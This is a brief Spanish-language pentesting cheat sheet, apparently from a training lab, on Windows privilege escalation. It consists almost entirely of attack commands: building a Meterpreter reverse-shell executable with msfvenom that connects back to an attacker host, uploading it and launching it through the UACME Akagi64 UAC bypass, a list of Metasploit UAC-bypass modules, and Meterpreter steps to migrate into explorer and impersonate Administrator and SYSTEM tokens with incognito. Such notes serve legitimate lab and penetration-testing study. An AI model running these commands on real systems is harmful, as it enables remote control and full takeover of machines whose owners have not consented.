# PRIVESC WINDOWS — UAC Bypass y Token Impersonation

## UAC Bypass (UACME)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > backdoor.exe

# En Meterpreter (sesión no privilegiada)
cd C:\\ && mkdir Temp && cd Temp
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
shell
Akagi64.exe 23 C:\Temp\backdoor.exe

# Módulos MSF UAC
exploit/windows/local/bypassuac_dotnet_profiler
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_sdclt
```

## Access Token Impersonation
```bash
pgrep explorer
migrate <explorer_PID>
getuid && getprivs

load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
impersonate_token "NT AUTHORITY\SYSTEM"
```
